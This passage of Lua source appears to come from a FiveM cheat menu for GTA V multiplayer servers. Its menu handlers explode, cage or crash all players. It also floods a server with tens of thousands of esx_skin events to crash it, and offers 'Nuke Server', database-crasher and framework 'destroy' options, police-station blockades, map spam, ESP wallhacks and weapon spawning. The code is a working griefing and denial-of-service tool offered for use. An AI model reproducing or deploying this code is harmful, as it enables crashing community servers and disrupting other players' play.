              elseif EVP.Button("~r~Cage~s~ All players") then
                cageall()
              elseif EVP.Button("~r~BORGAR~s~ All players") then
                borgarall()
              elseif EVP.Button("~r~Explode~s~ All players") then
                explodeall()
              elseif EVP.Button("~r~Give Weapons to~s~ All players") then
                weaponsall()
              elseif EVP.Button("~r~Crash~s~ All players") then
                for x = 0, 500 do
                  SetZoneEnabled(x, false)
                end
              elseif EVP.CheckBox( "~r~Handcuff~s~ All players", freezeall, function(enabled) freezeall = enabled end) then
              elseif EVP.CheckBox( "~r~Disable~s~ All Cars", cardz, function(enabled) cardz = enabled end) then
              elseif EVP.CheckBox( "~r~Disable~s~ All Guns", gundz, function(enabled) gundz = enabled end) then
              end
              EVP.Display()
            elseif EVP.IsMenuOpened(dddd) then
            if EVP.Button("~r~Airstrike ~s~Waypoint") then
              AirstrikeWaypoint()
            elseif EVP.Button("~r~Wildfire ~s~Server") then
              local pos = GetEntityCoords(PlayerPedId())
              local k = GetRandomVehicleInSphere(pos, 100.0, 0, 0)
              if k ~= GetVehiclePedIsIn(PlayerPedId(), 0) then
                  local targetpos = GetEntityCoords(k)
                  local x, y, z = table.unpack(targetpos)
                  local expposx = math.random(math.floor(x - 5.0), math.ceil(x + 5.0)) % x
                  local expposy = math.random(math.floor(y - 5.0), math.ceil(y + 5.0)) % y
                  local expposz = math.random(math.floor(z - 0.5), math.ceil(z + 1.5)) % z
                  AddExplosion(expposx, expposy, expposz, 1, 1.0, 1, 0, 0.0)
                  AddExplosion(expposx, expposy, expposz, 4, 1.0, 1, 0, 0.0)
              end
              
              for v in EnumeratePeds() do
                  if v ~= PlayerPedId() then
                      local targetpos = GetEntityCoords(v)
                      local x, y, z = table.unpack(targetpos)
                      local expposx = math.random(math.floor(x - 5.0), math.ceil(x + 5.0)) % x
                      local expposy = math.random(math.floor(y - 5.0), math.ceil(y + 5.0)) % y
                      local expposz = math.random(math.floor(z), math.ceil(z + 1.5)) % z
                      AddExplosion(expposx, expposy, expposz, 1, 1.0, 1, 0, 0.0)
                      AddExplosion(expposx, expposy, expposz, 4, 1.0, 1, 0, 0.0)
                  end
              end
            elseif EVP.Button("~r~Nuke ~s~Server") then
              nukeserver()
            elseif EVP.CheckBox( "~r~Silent ~s~Server ~y~Crasher", servercrasherxd, function(enabled) servercrasherxd = enabled end) then
            elseif EVP.Button("ESX Server Crasher") then
              for i = 1, 50000 do TriggerServerEvent('esx_skin:responseSaveSkin', {ESXSkin = 'loading'}) TriggerServerEvent('esx_skin:responseSaveSkin', 'Loading skin save') end
            elseif EVP.Button("~r~MAP - Block ~s~Simeons") then
              x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                              roundx = tonumber(string.format('%.2f', x))
                              roundy = tonumber(string.format('%.2f', y))
                              roundz = tonumber(string.format('%.2f', z))
                              local e8 = -145066854
                              RequestModel(e8)
                              while not HasModelLoaded(e8) do
                                  Citizen.Wait(0)
                              end
                    local cd1 = CreateObject(e8, -50.97, -1066.92, 26.52, true, true, false)
                    local cd2 = CreateObject(e8, -63.86, -1099.05, 25.26, true, true, false)
                    local cd3 = CreateObject(e8, -44.13, -1129.49, 25.07, true, true, false)
                              SetEntityHeading(cd1, 160.59)
                              SetEntityHeading(cd2, 216.98)
                    SetEntityHeading(cd3, 291.74)
                              FreezeEntityPosition(cd1, true)
                              FreezeEntityPosition(cd2, true)
                    FreezeEntityPosition(cd3, true)
                elseif EVP.Button("~r~MAP - Block ~s~Police Department") then
                x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                              roundx = tonumber(string.format('%.2f', x))
                              roundy = tonumber(string.format('%.2f', y))
                              roundz = tonumber(string.format('%.2f', z))
                              local e8 = -145066854
                              RequestModel(e8)
                              while not HasModelLoaded(e8) do
                                  Citizen.Wait(0)
                              end
                    local pd1 = CreateObject(e8, 439.43, -965.49, 27.05, true, true, false)
                              local pd2 = CreateObject(e8, 401.04, -1015.15, 27.42, true, true, false)
                              local pd3 = CreateObject(e8, 490.22, -1027.29, 26.18, true, true, false)
                              local pd4 = CreateObject(e8, 491.36, -925.55, 24.48, true, true, false)
                              SetEntityHeading(pd1, 130.75)
                              SetEntityHeading(pd2, 212.63)
                              SetEntityHeading(pd3, 340.06)
                              SetEntityHeading(pd4, 209.57)
                              FreezeEntityPosition(pd1, true)
                              FreezeEntityPosition(pd2, true)
                              FreezeEntityPosition(pd3, true)
                              FreezeEntityPosition(pd4, true)	
                elseif EVP.Button("~r~FUCK MAP") then
                  for i = -4000.0, 8000.0, 3.14159 do
                    local _, z1 = GetGroundZFor_3dCoord(i, i, 0, 0)
                    local _, z2 = GetGroundZFor_3dCoord(-i, i, 0, 0)
                    local _, z3 = GetGroundZFor_3dCoord(i, -i, 0, 0)
                    
                    CreateObject(GetHashKey("stt_prop_stunt_track_start"), i, i, z1, 0, 1, 1)
                    CreateObject(GetHashKey("stt_prop_stunt_track_start"), -i, i, z2, 0, 1, 1)
                    CreateObject(GetHashKey("stt_prop_stunt_track_start"), i, -i, z3, 0, 1, 1)
                end
            elseif EVP.Button("~g~ESX ~r~Destroy ~r~v3") then
              esxdestroyv3()
            elseif EVP.Button("~g~VRP ~r~Destroy ~r~V1") then
              vrpdestroy()
            elseif EVP.CheckBox( "~g~VRP ~r~Database Crasher", vrpdbc, function(enabled) vrpdbc = enabled end) then
            elseif EVP.CheckBox( "~g~GCPhone ~r~Destroy", gcphonedestroy, function(enabled) gcphonedestroy = enabled end) then
            elseif EVP.Button("~r~Rampinator LOL") then
              for vehicle in EnumerateVehicles() do
                local ramp = CreateObject(-145066854, 0, 0, 0, true, true, true)
                NetworkRequestControlOfEntity(vehicle)
                AttachEntityToEntity(ramp, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                NetworkRequestControlOfEntity(ramp)
                SetEntityAsMissionEntity(ramp, true, true)
              end
              end
              EVP.Display()
          elseif EVP.IsMenuOpened(WTNe) then
              drawDescription("Weapon list to give yourself", 0.80, 0.9)
              for k, v in pairs(l_weapons) do
                if EVP.MenuButton("~p~#~s~ "..k, WTSbull) then
                  WeaponTypeSelect = v
                end
              end
              EVP.Display()
          elseif EVP.IsMenuOpened(WTSbull) then
              for k, v in pairs(WeaponTypeSelect) do
                if EVP.MenuButton(v.name, WOP) then
                  WeaponSelected = v
                end
              end
              EVP.Display()
          elseif EVP.IsMenuOpened(WOP) then
              if EVP.Button("~r~Spawn Weapon") then
                GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(WeaponSelected.id), 1000, false)
              end
              if EVP.Button("~g~Add Ammo") then
                SetPedAmmo(GetPlayerPed(-1), GetHashKey(WeaponSelected.id), 5000)
              end
              if EVP.CheckBox("~r~Infinite ~s~Ammo", WeaponSelected.bInfAmmo, function(s)
              end) then
                WeaponSelected.bInfAmmo = not WeaponSelected.bInfAmmo
                SetPedInfiniteAmmo(GetPlayerPed(-1), WeaponSelected.bInfAmmo, GetHashKey(WeaponSelected.id))
                SetPedInfiniteAmmoClip(GetPlayerPed(-1), true)
                PedSkipNextReloading(GetPlayerPed(-1))
                SetPedShootRate(GetPlayerPed(-1), 1000)
              end
              for k, v in pairs(WeaponSelected.mods) do
                if EVP.MenuButton("~p~#~s~ ~r~> ~s~"..k, MSMSA) then
                  ModSelected = v
                end
              end
              EVP.Display()
          elseif EVP.IsMenuOpened(MSMSA) then
              for _, v in pairs(ModSelected) do
                if EVP.Button(v.name) then
                  GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(WeaponSelected.id), GetHashKey(v.id));
                end
              end
              EVP.Display()
          elseif EVP.IsMenuOpened(CTSa) then
              drawDescription("Spawn a car in front of you", 0.80, 0.9)
              for i, aName in ipairs(CarTypes) do
                if EVP.MenuButton("~p~#~s~ "..aName, CTS) then
                  carTypeIdx = i
                end
              end
              EVP.Display()
          elseif EVP.IsMenuOpened(CTS) then
              for i, aName in ipairs(CarsArray[carTypeIdx]) do
                if EVP.MenuButton("~p~#~s~ ~r~>~s~ "..aName, cAoP) then
                  carToSpawn = i
                end
              end
              EVP.Display()
          elseif EVP.IsMenuOpened(cAoP) then
              if EVP.CheckBox("~g~Spawn inside", spawninside, function(enabled) spawninside = enabled end) then
              elseif EVP.Button("~r~Spawn Car") then
                local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                local veh = CarsArray[carTypeIdx][carToSpawn]
                if veh == nil then
                  veh = "adder"
                end
                vehiclehash = GetHashKey(veh)
                RequestModel(vehiclehash)
                Citizen.CreateThread(function()
                local waiting = 0
                while not HasModelLoaded(vehiclehash) do
                  waiting = waiting + 100
                  Citizen.Wait(100)
                  if waiting > 5000 then
                    ShowNotification("~r~Cannot spawn this vehicle.")
                    break
                  end
                end
                SpawnedCar = CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1))+90, 1, 0)
                SetVehicleStrong(SpawnedCar, true)
                SetVehicleEngineOn(SpawnedCar, true, true, false)
                SetVehicleEngineCanDegrade(SpawnedCar, false)
                if spawninside then
                  SetPedIntoVehicle(PlayerPedId(-1), SpawnedCar, -1)
                end
                end)
              end
              EVP.Display()
          elseif EVP.IsMenuOpened(MTS) then
              drawDescription("Be in a car/truck, then spawn any trailer", 0.80, 0.9)
              if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                for i, aName in ipairs(Trailers) do
                  if EVP.MenuButton("~p~#~s~ ~r~>~s~ "..aName, CTSmtsps) then
                    TrailerToSpawn = i
                  end
                end
              else
                notify("~w~Not in a vehicle", true)
              end
              EVP.Display()
          elseif EVP.IsMenuOpened(CTSmtsps) then
              if EVP.Button("~r~Spawn Car") then
                local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                local veh = Trailers[TrailerToSpawn]
                if veh == nil then veh = "adder" end
                vehiclehash = GetHashKey(veh)
                RequestModel(vehiclehash)
                Citizen.CreateThread(function()
                local waiting = 0
                while not HasModelLoaded(vehiclehash) do
                  waiting = waiting + 100
                  Citizen.Wait(100)
                  if waiting > 5000 then
                    ShowNotification("~r~Cannot spawn this vehicle.")
                    break
                  end
                end
                local SpawnedCar = CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1))+90, 1, 0)
                local UserCar = GetVehiclePedIsUsing(GetPlayerPed(-1))
                AttachVehicleToTrailer(Usercar, SpawnedCar, 50.0)
                SetVehicleStrong(SpawnedCar, true)
                SetVehicleEngineOn(SpawnedCar, true, true, false)
                SetVehicleEngineCanDegrade(SpawnedCar, false)
                end)
              end
              EVP.Display()
          elseif EVP.IsMenuOpened(GSWP) then
              drawDescription("Weapon list to give to the player", 0.80, 0.9)
              for i = 1, #allWeapons do
                if EVP.Button(allWeapons[i]) then
                  GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, true)
                end
              end
              EVP.Display()
          elseif EVP.IsMenuOpened(espa) then
              drawDescription("Extra Sensory Perception menu", 0.80, 0.9)
              if EVP.CheckBox("~r~ESP ~s~MasterSwitch", esp, function(enabled) esp = enabled end) then
              elseif EVP.CheckBox("~r~ESP ~s~Box", espbox, function(enabled) espbox = enabled end) then
              elseif EVP.CheckBox("~r~ESP ~s~Info", espinfo, function(enabled) espinfo = enabled end) then
              elseif EVP.CheckBox("~r~ESP ~s~Lines", esplines, function(enabled) esplines = enabled end) then
              end
              EVP.Display()
          elseif EVP.IsMenuOpened(LSCC) then
              drawDescription("Apply some cool stuff to your car", 0.80, 0.9)
              local veh = GetVehiclePedIsUsing(PlayerPedId())
              if EVP.MenuButton("~p~#~s~ ~r~Exterior ~s~Tuning", tngns) then
              elseif EVP.MenuButton("~p~#~s~ ~r~Performance ~s~Tuning", prof) then
              elseif EVP.Button("~b~Max ~s~Tuning") then
                MaxOut(GetVehiclePedIsUsing(PlayerPedId(-1)))
              elseif EVP.Button("Change Car License Plate") then
                carlicenseplaterino()
              elseif EVP.CheckBox("~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Vehicle Colour", RainbowVeh, function(enabled) RainbowVeh = enabled end) then
              elseif EVP.Button("Make vehicle ~y~dirty") then
                Clean(GetVehiclePedIsUsing(PlayerPedId(-1)))
              elseif EVP.Button("Make vehicle ~g~clean") then
                Clean2(GetVehiclePedIsUsing(PlayerPedId(-1)))
              elseif EVP.CheckBox("Always ~g~Clean", AlwaysClean, function(enabled) AlwaysClean = enabled end) then
              elseif EVP.CheckBox("~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Neons & Headlights", rainbowh, function(enabled) rainbowh = enabled end) then
              end
              EVP.Display()
          elseif EVP.IsMenuOpened(bmm) then
              drawDescription("Give your car nitro", 0.80, 0.9)
              if EVP.ComboBox("Engine ~r~Power ~s~Booster", powerboost, currentItemIndex, selectedItemIndex, function(currentIndex, selectedIndex)
              currentItemIndex = currentIndex
              selectedItemIndex = selectedIndex
              SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), selectedItemIndex * 20.0)
              end) then
            elseif EVP.CheckBox("Engine ~g~Torque ~s~Booster ~g~2x", t2x, function(enabled)
                t2x = enabled
                t4x = false
                t10x = false
                t16x = false
                txd = false
                tbxd = false
                end) then
            elseif EVP.CheckBox("Engine ~g~Torque ~s~Booster ~g~4x", t4x, function(enabled)
                t2x = false
                t4x = enabled
                t10x = false
                t16x = false
                txd = false
                tbxd = false
                end) then
            elseif EVP.CheckBox("Engine ~g~Torque ~s~Booster ~g~10x", t10x, function(enabled)
                t2x = false
                t4x = false
                t10x = enabled
                t16x = false
                txd = false
                tbxd = false
                end) then
            elseif EVP.CheckBox("Engine ~g~Torque ~s~Booster ~g~16x", t16x, function(enabled)
                t2x = false
                t4x = false
                t10x = false
                t16x = enabled
                txd = false
                tbxd = false
                end) then
            elseif EVP.CheckBox("Engine ~g~Torque ~s~Booster ~y~XD", txd, function(enabled)
                t2x = false
                t4x = false
                t10x = false
                t16x = false
                txd = enabled
                tbxd = false
                end) then
            elseif EVP.CheckBox("Engine ~g~Torque ~s~Booster ~y~BIG XD", tbxd, function(enabled)
              t2x = false
              t4x = false
              t10x = false
              t16x = false
              txd = false
              tbxd = enabled
              end) then
              end
            EVP.Display()
            end
        Citizen.Wait(0)
      end
end)
